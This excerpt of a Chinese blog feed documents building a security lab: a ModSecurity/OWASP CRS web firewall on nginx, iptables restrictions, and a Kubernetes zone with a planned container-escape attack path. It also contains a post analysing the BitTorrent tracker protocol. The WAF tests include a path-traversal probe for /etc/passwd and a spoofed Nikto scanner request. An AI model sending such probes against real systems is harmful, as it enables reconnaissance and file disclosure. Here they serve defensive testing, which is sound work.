class="line">$ make check</span><br><span class="line">$ make install</span><br><span class="line">$ ldconfig</span><br></pre></td></tr></table></figure><p><strong>安装 ModSecurity</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ git clone --depth 1 -b v3/master --single-branch &lt;https://github.com/SpiderLabs/ModSecurity&gt;</span><br><span class="line">$ cd ModSecurity</span><br><span class="line">$ git submodule init</span><br><span class="line">$ git submodule update</span><br><span class="line">$ ./build.sh</span><br><span class="line">$ ./configure --with-maxmind=/usr/local</span><br><span class="line">$ make &amp;&amp; make install</span><br></pre></td></tr></table></figure><blockquote><p>出现 fatal: No names found, cannot describe anything. 报错忽略即可</p></blockquote><blockquote><p>如果连接不上 git 可以使用 代理服务</p></blockquote><p>下载用于 <code>ModSecurity</code> 的 <code>nginx</code> 连接器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git clone --depth 1 &lt;https://github.com/SpiderLabs/ModSecurity-nginx.git&gt;</span><br></pre></td></tr></table></figure><p>确定当前 nginx 版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ nginx -v</span><br><span class="line">nginx version: nginx/1.20.1</span><br></pre></td></tr></table></figure><p>下载与安装版本对应的源代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ wget &lt;http://nginx.org/download/nginx-1.20.1.tar.gz&gt;</span><br><span class="line">$ tar -zxvf nginx-1.20.1.tar.gz</span><br><span class="line">$ cd nginx-1.20.1</span><br></pre></td></tr></table></figure><h5 id="Modsecurity动态编译"><a href="#Modsecurity动态编译" class="headerlink" title="Modsecurity动态编译"></a>Modsecurity动态编译</h5><p>编译动态模块，复制到 <code>nginx</code> 模块标准目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 查看当前 nginx 编译参数</span><br><span class="line">$ nginx -V</span><br><span class="line"># 复制 nginx 所有参数，删除所有 --add-module 选项</span><br><span class="line">$ ./configure --add-dynamic-module=../ModSecurity-nginx ...</span><br><span class="line">$ make modules</span><br><span class="line">$ cp objs/ngx_http_modsecurity_module.so /etc/nginx/modules/</span><br></pre></td></tr></table></figure><p><strong>注意：这里的模块是放到了/etc/nginx/modules/目录下，但实操过程中，这样配置完无法运行nginx（报错是找不到目的文件）。</strong></p><p><img src="https://cdn.jsdelivr.net/gh/Biscuit19/PicGo/img/image-20230319164315108.png" alt="https://cdn.jsdelivr.net/gh/Biscuit19/PicGo/img/image-20230319164315108.png"></p><p><strong>经分析，原始配置文件的模块加载默认地址似乎为/usr/share/nginx/modules/，所以实操时还执行了一句cp objs/ngx_http_modsecurity_module.so /usr/share/nginx/modules/，才得以成功运行，这个地方之后可能还要再修改。</strong></p><p>加载模块：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/nginx/nginx.conf</span><br><span class="line">load_module modules/ngx_http_modsecurity_module.so;</span><br></pre></td></tr></table></figure><p>修改 <code>nginx</code> 配置文件，在主配置文件 <code>events</code> 上加入一行，具体路径根据自己 <code>nginx</code> 模块路径来定</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load_module modules/ngx_http_modsecurity_module.so;</span><br></pre></td></tr></table></figure><p>重新加载配置： nginx -s reload</p><h5 id="Modsecurity配置"><a href="#Modsecurity配置" class="headerlink" title="Modsecurity配置"></a>Modsecurity配置</h5><p>1.创建一个mod配置文件夹：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/nginx/modsec</span><br></pre></td></tr></table></figure><p>2.给modsec文件夹添加配置文件，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget</span><br><span class="line">&lt;https://raw.githubusercontent.com/SpiderLabs/ModSecurity/v3/master/modsecurity.conf-recommended&gt;</span><br><span class="line">wget &lt;https://raw.githubusercontent.com/SpiderLabs/ModSecurity/v3/master/unicode.mapping&gt;</span><br><span class="line"></span><br><span class="line">mv modsecurity.conf-recommended modsecurity.conf</span><br></pre></td></tr></table></figure><p>3.将modsecurity.conf中现有的SecRuleEngine修改为On：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># SecRuleEngine DetectionOnly</span><br><span class="line">SecRuleEngine On</span><br></pre></td></tr></table></figure><p>4.创建自定义规则，如下规则意为param参数若出现test字段，则deny，返回403.</p><p>vim  /etc/nginx/modsec/main.conf</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># Include the recommended configuration</span><br><span class="line">Include /etc/nginx/modsec/modsecurity.conf</span><br><span class="line"># A test rule</span><br><span class="line">SecRule ARGS:param &quot;@contains test&quot; &quot;id:1234,deny,log,status:403&quot;</span><br></pre></td></tr></table></figure><p>5.在nginx的conf中添加刚才的配置来启用modsec</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/nginx/conf.d/proxy.conf</span><br><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    modsecurity on;</span><br><span class="line">    modsecurity_rules_file /etc/nginx/modsec/main.conf;</span><br><span class="line"> location / &#123;</span><br><span class="line"> proxy_pass &lt;http://localhost:8085&gt;;</span><br><span class="line"> proxy_set_header Host $host;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">[root@centos24-4 modsec]# nginx -s reload</span><br></pre></td></tr></table></figure><p>通过发出在查询字符串param参数的值中包含字符串test的请求，验证步骤4中配置的规则是否正常工作，出现403证明触发了相应的规则，进一步可以在log里看到触发的是我们自定义的规则。</p><p><img src="https://cdn.jsdelivr.net/gh/Biscuit19/PicGo/img/image-20230318165327448.png" alt="https://cdn.jsdelivr.net/gh/Biscuit19/PicGo/img/image-20230318165327448.png"></p><h5 id="Nginx反向代理配置"><a href="#Nginx反向代理配置" class="headerlink" title="Nginx反向代理配置"></a>Nginx反向代理配置</h5><p>在Ubuntu-WebServer（192.168.254.133）上运行nginx服务：</p><p><img src="https://cdn.jsdelivr.net/gh/Biscuit19/PicGo/img/image-20230319145434651.png" alt="https://cdn.jsdelivr.net/gh/Biscuit19/PicGo/img/image-20230319145434651.png"></p><p><img src="https://cdn.jsdelivr.net/gh/Biscuit19/PicGo/img/image-20230319150604338.png" alt="https://cdn.jsdelivr.net/gh/Biscuit19/PicGo/img/image-20230319150604338.png"></p><p>在Centos7-WAF（192.168.254.133）上运行开启了ModSecurity动态模块的Nginx服务，配置该Nginx服务，使其反向代理Ubuntu-WebServer（192.168.254.133）的Nginx服务：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/nginx/conf.d/proxy.conf</span><br><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    modsecurity on;</span><br><span class="line">    modsecurity_rules_file /etc/nginx/modsec/main.conf;</span><br><span class="line"> location / &#123;</span><br><span class="line"> proxy_pass &lt;http://192.168.254.133/&gt;;</span><br><span class="line"> proxy_set_header Host $host;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">[root@centos24-4 modsec]# nginx -s reload</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Biscuit19/PicGo/img/image-20230319150249272.png" alt="https://cdn.jsdelivr.net/gh/Biscuit19/PicGo/img/image-20230319150249272.png"></p><p>其中modsecurity on; 开启了ModSecurity模块，</p><p>modsecurity_rules_file /etc/nginx/modsec/main.conf; 指定了ModSecurity规则。</p><p>重启服务systemctl restart nginx</p><p><img src="https://cdn.jsdelivr.net/gh/Biscuit19/PicGo/img/image-20230319150552134.png" alt="https://cdn.jsdelivr.net/gh/Biscuit19/PicGo/img/image-20230319150552134.png"></p><h5 id="ModSecurity引用OWASP-CRS-规则"><a href="#ModSecurity引用OWASP-CRS-规则" class="headerlink" title="ModSecurity引用OWASP CRS 规则"></a>ModSecurity引用OWASP CRS 规则</h5><blockquote><p>OWASP CRS (OWASP ModSecurity Core Rule Set) 是一个开源的 Web 应用程序防火墙 (WAF) 规则集，它是基于 ModSecurity 开发的。</p></blockquote><p><a href="https://github.com/coreruleset/coreruleset">github 地址</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ cd /etc/nginx/modsec</span><br><span class="line">$ wget -O coreruleset-3.3.4.tar.gz &lt;https://codeload.github.com/coreruleset/coreruleset/tar.gz/refs/tags/v3.3.4&gt;</span><br><span class="line">$ tar -zxvf coreruleset-3.3.4.tar.gz</span><br><span class="line">$ cd coreruleset-3.3.4</span><br><span class="line">$ cp crs-setup.conf.example crs-setup.conf</span><br></pre></td></tr></table></figure><p>在 <code>modsec/main.conf</code> 配置文件里引入 <code>CRS</code> 配置和规则</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ vim /etc/nginx/modsec/main.conf</span><br><span class="line">include coreruleset-3.3.4/crs-setup.conf</span><br><span class="line">include coreruleset-3.3.4/rules/*.cnf</span><br><span class="line">$ curl -H &quot;User-Agent: Nikto&quot; &lt;http://localhost&gt;</span><br></pre></td></tr></table></figure><p>验证部分规则，如访问限制：访问<a href="http://192.168.254.128/nginx.conf%EF%BC%8C">http://192.168.254.128/nginx.conf，</a></p><p><img src="https://cdn.jsdelivr.net/gh/Biscuit19/PicGo/img/image-20230319162153905.png" alt="https://cdn.jsdelivr.net/gh/Biscuit19/PicGo/img/image-20230319162153905.png"></p><p>参数过滤：<a href="http://192.168.254.128/?param=/etc/passwd%EF%BC%88%E6%95%8F%E6%84%9F%E7%9B%AE%E5%BD%95%E5%8F%82%E6%95%B0%EF%BC%89">http://192.168.254.128/?param=/etc/passwd（敏感目录参数）</a></p><p><img src="https://cdn.jsdelivr.net/gh/Biscuit19/PicGo/img/image-20230319162317296.png" alt="https://cdn.jsdelivr.net/gh/Biscuit19/PicGo/img/image-20230319162317296.png"></p><h5 id="配置路由限制其他ip访问WebServer"><a href="#配置路由限制其他ip访问WebServer" class="headerlink" title="配置路由限制其他ip访问WebServer"></a>配置路由限制其他ip访问WebServer</h5><p>使用iptables，使得除了WAF服务器外的ip地址都无法访问WebServer。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#先关闭所有的对本机80端口的访问</span><br><span class="line">iptables -I INPUT -p tcp --dport 80 -j DROP</span><br><span class="line"></span><br><span class="line">#只开放192.168.254.133 对本机80端口的访问</span><br><span class="line">iptables -I INPUT -s 192.168.254.133 -p tcp --dport 80 -j ACCEPT</span><br><span class="line"></span><br><span class="line">#开启ip段192.168.1.0/24端的80口</span><br><span class="line">iptables -I INPUT -s 192.168.1.0/24 -p tcp --dport 80 -j ACCEPT</span><br></pre></td></tr></table></figure><p>无法访问web服务器：</p><p><img src="https://cdn.jsdelivr.net/gh/Biscuit19/PicGo/img/image-20230319170206666.png" alt="https://cdn.jsdelivr.net/gh/Biscuit19/PicGo/img/image-20230319170206666.png"></p><p>只能访问代理服务器：</p><p><img src="https://cdn.jsdelivr.net/gh/Biscuit19/PicGo/img/image-20230319170255698.png" alt="https://cdn.jsdelivr.net/gh/Biscuit19/PicGo/img/image-20230319170255698.png"></p><h5 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h5><p>1、If any other virtual servers (server blocks) in your NGINX configuration listen on port 80, you need to disable them for the reverse proxy to work correctly. For example, the /etc/nginx/conf.d/default.conf file provided in the nginx package includes such a server block. Comment out or remove the server block, but do not remove or rename the default.conf file itself – if the file is missing during an upgrade, it is automatically restored, which can break the reverse-proxy configuration.</p><p>如果原来nginx有默认在80端口的服务，要把它移除，否则会影响代理服务器的运行。但是不要删去那个配置文件。</p><p>默认的主页在：/usr/share/nginx/html</p><p><img src="https://cdn.jsdelivr.net/gh/Biscuit19/PicGo/img/image-20230318152047313.png" alt="https://cdn.jsdelivr.net/gh/Biscuit19/PicGo/img/image-20230318152047313.png"></p><p>原有默认配置在：/etc/nginx/nginx.conf</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        listen       [::]:80;</span><br><span class="line">        server_name  _;</span><br><span class="line">        root         /usr/share/nginx/html;</span><br><span class="line"></span><br><span class="line">        # Load configuration files for the default server block.</span><br><span class="line">        include /etc/nginx/default.d/*.conf;</span><br><span class="line"></span><br><span class="line">        error_page 404 /404.html;</span><br><span class="line">        location = /404.html &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        error_page 500 502 503 504 /50x.html;</span><br><span class="line">        location = /50x.html &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>把这个server删掉即可。</p><p>2、配置路径问题</p><p>配置过程中存在很多路径，不同教程的配置路径都不同，需要先规划好各模块存放的路径，包括编译时的路径，ModSecurity规则的路径，模块的路径等。如模块路径问题：</p><p><strong>注意：这里的模块是放到了/etc/nginx/modules/目录下，但实操过程中，这样配置完无法运行nginx（报错是找不到目的文件）。</strong></p><p><img src="https://cdn.jsdelivr.net/gh/Biscuit19/PicGo/img/image-20230319164315108.png" alt="https://cdn.jsdelivr.net/gh/Biscuit19/PicGo/img/image-20230319164315108.png"></p><p><strong>经分析，原始配置文件的模块加载默认地址似乎为/usr/share/nginx/modules/，还执行了一句cp objs/ngx_http_modsecurity_module.so /usr/share/nginx/modules/</strong></p><h5 id="配置文件位置整理"><a href="#配置文件位置整理" class="headerlink" title="配置文件位置整理"></a>配置文件位置整理</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ModSecurity源代码位置：/opt/ModSecurity</span><br><span class="line">模块源代码存放位置：/opt/ModSecurity/nginx-1.20.1</span><br><span class="line"></span><br><span class="line">编译后模块文件存放位置：/etc/nginx/modules/</span><br><span class="line">ModSecurity规则文件：/etc/nginx/modsec/main.conf</span><br><span class="line">Nginx代理配置文件：/etc/nginx/conf.d/proxy.conf</span><br></pre></td></tr></table></figure><h4 id="postfix邮件服务器简单搭建"><a href="#postfix邮件服务器简单搭建" class="headerlink" title="postfix邮件服务器简单搭建"></a>postfix邮件服务器简单搭建</h4><p><img src="https://cdn.jsdelivr.net/gh/Biscuit19/PicGo/img/image-20230319171526895.png" alt="https://cdn.jsdelivr.net/gh/Biscuit19/PicGo/img/image-20230319171526895.png"></p><h3 id="2-云服务区-Kubernetes"><a href="#2-云服务区-Kubernetes" class="headerlink" title="2.云服务区-Kubernetes"></a>2.云服务区-Kubernetes</h3><h4 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h4><p>​    Kubernetes（简称K8s）是一个开源的容器编排平台，提供了容器集群的调度、部署、扩缩、服务发现和负载均衡等功能，可以帮助企业更高效地管理和运维容器化应用程序。Kubernetes可以支持多种容器运行时，其中包括Docker、containerd、CRI-O等。在Kubernetes中，Docker作为一个容器运行时（Container Runtime），被集成在Kubernetes的容器引擎中，用于管理和运行容器镜像。Kubernetes不是基于Docker构建的，但是Kubernetes可以使用Docker镜像，并集成了Docker作为其中一个容器运行时的实现。</p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230319203530494.png" alt="image-20230319212643244" style="zoom: 67%;" /><ul><li><p>API Server是整个系统的对外接口，供客户端和其它组件调用；</p></li><li><p>Scheduler负责对集群内部的资源进行调度；</p></li><li><p>Controller manager负责管理控制器；</p></li></ul><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230319215001729.png" alt="image-20230319214510993" style="zoom:80%;" /><p>​    API server是所有请求的唯一入口，Pod是Kubernetes最基本的操作、部署单元，其作为一组容器的结合，在通pod中的容器共享网络命名空间。一个Pod代表着集群中运行的一个进程，它内部封装了一个或多个紧密相关的容器。除了Pod之外，K8S还有一个<strong>Service</strong>的概念，一个Service可以看作一组提供相同服务的Pod的对外访问接口。每一个node中有Kubelet、Kube-proxy等为该node提供服务。</p><p>​    Kubelet，主要负责监视指派到它所在Node上的Pod，包括创建、修改、监控、删除等。</p><p>​    Kube-proxy，主要负责为Pod对象提供代理。</p><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>•   参考动力节点教程学习k8s，搭建master和node节点</p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230319214510993.png" alt="image-20230319210554865" style="zoom:67%;" /><h4 id="漏洞设立"><a href="#漏洞设立" class="headerlink" title="漏洞设立"></a>漏洞设立</h4><p>​    攻击思路：创建以ubuntu为基础镜像的容器，在其中部署Nginx与存在web漏洞的网站，通过web获取对于云主机的接入权限后，使用操作系统的漏洞用来提权，然后触发容器逃逸漏洞逃逸到企业内网。如下，对于容器逃逸漏洞进行了复现的尝试工作。</p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230319210554865.png" alt="image-20230319215001729" style="zoom: 67%;" /><p>Kubernetes 通过多层安全措施来增强容器的安全性，但也不能完全防止容器逃逸漏洞：</p><ol><li>安全上下文：Kubernetes 通过安全上下文为容器内的进程提供了隔离和限制权限的功能。安全上下文定义了容器内进程的用户、组、访问控制和特权等级，从而限制了进程的访问权限。</li><li>安全性设置：Kubernetes 提供了一些安全性设置，如限制容器的 CPU、内存、网络和文件系统等资源的使用量，限制容器能够访问的主机系统的资源等。</li><li>网络隔离：Kubernetes 使用网络隔离来防止容器之间的攻击。每个容器都有一个唯一的 IP 地址，并且可以使用网络策略来限制容器之间的通信。</li><li>权限控制：Kubernetes 提供了丰富的权限控制机制，可以对不同的用户或角色进行访问控制。例如，可以使用 Role-based access control（RBAC）来限制用户对 Kubernetes 资源的访问权限。</li></ol><h3 id="3-办公区"><a href="#3-办公区" class="headerlink" title="3.办公区"></a>3.办公区</h3><h4 id="windows域"><a href="#windows域" class="headerlink" title="windows域"></a>windows域</h4><h4 id="内网web服务"><a href="#内网web服务" class="headerlink" title="内网web服务"></a>内网web服务</h4><p>使用apache部署简单的web服务和数据库。</p><h4 id="IDS"><a href="#IDS" class="headerlink" title="IDS"></a>IDS</h4><p>可使用suricata的对应模式。</p>]]></content>
      
      
      <categories>
          
          <category> environment </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>P2P协议处理流程分析</title>
      <link href="/2023/03/14/P2P%E5%8D%8F%E8%AE%AE%E5%A4%84%E7%90%86%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/"/>
      <url>/2023/03/14/P2P%E5%8D%8F%E8%AE%AE%E5%A4%84%E7%90%86%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="P2P协议处理流程分析"><a href="#P2P协议处理流程分析" class="headerlink" title="P2P协议处理流程分析"></a>P2P协议处理流程分析</h1><h2 id="一、P2P网络应用简述"><a href="#一、P2P网络应用简述" class="headerlink" title="一、P2P网络应用简述"></a>一、P2P网络应用简述</h2><h3 id="1-P2P概念"><a href="#1-P2P概念" class="headerlink" title="1.P2P概念"></a>1.P2P概念</h3><p>​    传统如http、ftp等下载文件资源的方式都存在一个共同的问题，即无法缓解服务器节点的带宽压力，这也是基于C/S结构网络应用的通病。P2P（peer-to-peer）下载方式有效的缓解了这一问题，这一解决方式的思路就是将单个资源，分散的存储在多台设备上，分别与这些节点建立连接就可以就近下载，提高下载速度，缓解中心服务器带宽压力。在使用p2p应用时，个人电脑也可以作为peer也就是节点之一，也就是同时作为下载方，和所掌握资源的服务器。</p><p>​    最为常见的P2P应用就是种子文件下载器，如比特彗星、迅雷等软件。</p><h3 id="2-torrent概述"><a href="#2-torrent概述" class="headerlink" title="2. torrent概述"></a>2. torrent概述</h3><p>​    要完成P2P协议对于节点下载资源的设想，首先，一个需要下载资源的节点（我们假设称为下载者），需要知道有哪些节点具有资源，因此，下载者在使用迅雷等软件下载文件前，首先需要获取对应的种子文件，</p><p>​    如下图，为下载Ubuntu早期版本镜像的种子文件使用notepad打开后：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230312204751117.png" alt="image-20230312204751117"></p><p>​        理论上，.torrent 文件由<strong>Announce（Tracker URL）</strong>和<strong>文件信息</strong>两部分组成，前者给出了文件的Tracker 地址，此Tracker也就是下载者得知那些节点具有资源的告知者，如上图所示，可见字符部分给出的就是所需要镜像Tracker的地址和资源的长度、块数等信息。（这里有一个细节，就是torrent文件是由一种特殊的编码方式——Bencode编码的，但是由于本文不探讨编码，故掠过，可参考：<a href="https://www.jianshu.com/p/c26de7a04c38%EF%BC%89">https://www.jianshu.com/p/c26de7a04c38）</a></p><p>​    而后者，文件信息里有以下内容：</p><ul><li><strong>Info 区</strong>：指定该种子包含的文件数量、文件大小及目录结构，包括目录名和文件名；</li><li><strong>Name 字段</strong>：指定顶层目录名字；</li><li><strong>每个段的大小</strong>：BitTorrent（BT）协议把一个文件分成很多个小段，然后分段下载；</li><li><strong>段哈希值</strong>：将整个种子种，每个段的 SHA-1 哈希值拼在一起。</li></ul><p>​    下载时，BT 客户端首先解析 .torrent 文件，得到 Tracker 地址，然后连接 Tracker 服务器。Tracker 服务器回应下载者的请求，将其他下载者（包括发布者）的 IP 提供给下载者，下载者就可以使用P2P协议进行连接后，下载资源。</p><h2 id="二、协议流程"><a href="#二、协议流程" class="headerlink" title="二、协议流程"></a>二、协议流程</h2><h3 id="1-BitTorrent-Tracker"><a href="#1-BitTorrent-Tracker" class="headerlink" title="1.BitTorrent Tracker"></a>1.BitTorrent Tracker</h3><p>​    上文中说到，通过BT Tracker可以知道当前有哪些终端在同时下载，或者掌握了目标资源。在迅雷上，选择对应种子文件，点击确定下载后，会显示”解析中“，而后开始下载，在此过程中，我们可以捕捉一下流量：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230312212354578.png" alt="image-20230312212354578"></p><p>​    首先，对种子文件所提供的域名进行了DNS解析，获取该域名的ip地址。</p><p>​    建立TCP连接后，发送了如下HTTP请求（Tracker核心数据包）：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230312212804322.png" alt="image-20230312212804322"></p><p>Tracker GET 请求包含如下参数:</p><ul><li>info_hash, 20 字节, 将 .torrent 文件中的 info 键对应的值生成的 SHA1 哈希, 该哈希值可作为所要请求的资源的标识符</li><li>peer_id, 终端生成的 20 个字符的唯一标识符, 每个进行 BT 下载的终端随机生成的 20 个字符的字符串作为其标识符 (终端应在每次开始一个新的下载任务时重新随机生成一个新的 peer_id)</li><li>IP (可选), 该终端的 IP 地址, 一般情况下该参数没有必要, 因为传输层 (Transport Layer, 如 TCP) 本身可以获取 IP 地址, 但比如 BT 下载器通过 Proxy 与 Tracker 交互时, 该在该字段中设置源端的真实 IP</li><li>Port, 该终端正在监听的端口 (因为 BT 协议是 P2P 的, 所以每一个下载终端也都会暴露一个端口, 供其它结点下载), BT 下载器首先尝试监听 6881 端口, 若端口被占用被继续尝试监听 6882 端口, 若仍被占用则继续监听 6883, 6884 … 直到 6889 端口, 若以上所有端口都被占用了, 则放弃尝试</li><li>uploaded, 当前已经上传的文件的字节数 (十进制数字表示)</li><li>downloaded, 当前已经下载的文件的字节数 (十进制数字表示)</li><li>left, 当前仍需要下载的文件的字节数 (十进制数字表示)</li><li>numwant, 可选, 希望 BT Tracker 返回的 peer 数目, 若不填, 默认返回 50 个 IP 和 Port</li><li>event, 可选, 该参数的值可以是 started, completed, stopped, empty 其中的一个, 该参数的值为 empty 与该参数不存在是等价的, 当开始下载时, 该参数的值设置为 started, 当下载完成时, 该参数的值设置为 completed, 当下载停止时, 该参数的值设置为 stopped</li></ul><p>请求成功时, BT Tracker 返回的字典中应含有以下 Key（这里记录由于我的失误，第一次没有抓到这个包，重新抓的时候，迅雷大概是在本地保存了某种缓存机制，未进行Tracker请求，因此没有抓到这个包，非常恼火，然后我换了一个种子资源，跟踪http流应该就能找到，但我并不知道为啥好像我这个不太对劲，猜测是未解析成功，后续使用了其他方式进行解析）</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230312215157309.png" alt="image-20230312215157309"></p><p>但是理论上，tracker应该做如下回复：</p><ul><li>warnging message, 当发生非致命性错误时, Tracker 返回的可读的警告信息</li><li>interval, 对应的 Value 是终端在下一次请求 BT Tracker 前应等待的时间 (以秒为单位)</li><li>min interval, 对应的 Value 是终端在下一次请求 BT Tracker 前的最短等待时间 (以秒为单位)</li><li>complete, 对应的 Value 表明当前已完成整个资源下载的 peer 的数量</li><li>incomplete, 对应的 Value 表明当前未完成整个资源下载的 peer 的数量</li><li>peers, 对应的 Value 是一个字典的列表, 即列表的每一个元素都是一个字典, 每个字典包含有两个 Key, 分别为:<ul><li>peer id, peer 结点的 Id</li><li>IP, peer 结点的 IP 地址</li><li>Port, peer 结点的端口</li></ul></li></ul><p>后续进行了查询，上述规则描述的是最基本的Torrent协议，在经过一定的更新和调整后，市面上大多数软件（如迅雷）都已不再符合基础的传输标准了。在P2P的基础上，可能引入TLS等协议保证安全性。</p><p>而后，建立基于TLS1.2的加密通信开始传输：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230312212532162.png" alt="image-20230312212532162"></p><h3 id="2-数据传输策略"><a href="#2-数据传输策略" class="headerlink" title="2. 数据传输策略"></a>2. 数据传输策略</h3><h4 id="数据的分块"><a href="#数据的分块" class="headerlink" title="数据的分块"></a>数据的分块</h4><p>​    传输过程中，完整的数据会被分割成更小的片段，这些碎片有一个固定的大小，以保证tracker能够掌握谁拥有哪些数据碎片。通过对于数据的分块处理，下载者可以通过对应块的哈希值检查数据的完整性。这些哈希码作为 “metainfo file”的一部分被储存起来，在前文讨论种子文件时，我们已经提到过。</p><p>​    在同一个种子文件中，每一个碎片，也就是piece的大小保持不变，但是最后的一个碎片的大小是不规则的。piece大小的分配取决于数据量。太大的piece会导致下载效率低下（同时，一旦其中一块损坏，必须重新下载该块）；如果片段大小太小，则需要运行更多的哈希检查，使得效率降低，种子文件也变得臃肿。因此，一般来讲，应当通过piece大小的选择，使得metainfo文件不大于<strong>50-75kb</strong>。比较常见的碎片大小是256kb、512kb和1mb。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/pieces.png" alt="img"></p><p>​    如上图，一个1.4mb大小的文件配分为六块，其中前五块为5*256kb，最后一块为120kb。</p><h4 id="peer的选取"><a href="#peer的选取" class="headerlink" title="peer的选取"></a>peer的选取</h4><p>​    Peer们不停的以队列的方式下载所需要的文件块，因此，tracker也需要同时持续的回复peer，内容为掌握对应piece得peer列表。那么进一步的，本地的peer客户端就需要根据策略，向对应的peer获取对应piece。策略如下：</p><ul><li>Random First Piece：当首次开始下载，由于当前peer没有任何东西可以进行上传（即和其他peer共享），可直接<strong>随机</strong>选取一个piece进行下载。</li><li>Rarest First：首次下载完成后，执行”rarest first“即稀有度优先政策进行下载。</li><li>Endgame Mode：当下载马上要被完成时，为了避免后续有传输较慢的piece，则会同时向所有已知掌握了piece的peer发送请求。</li></ul><p>​    <strong>稀有度优先策略（rarest 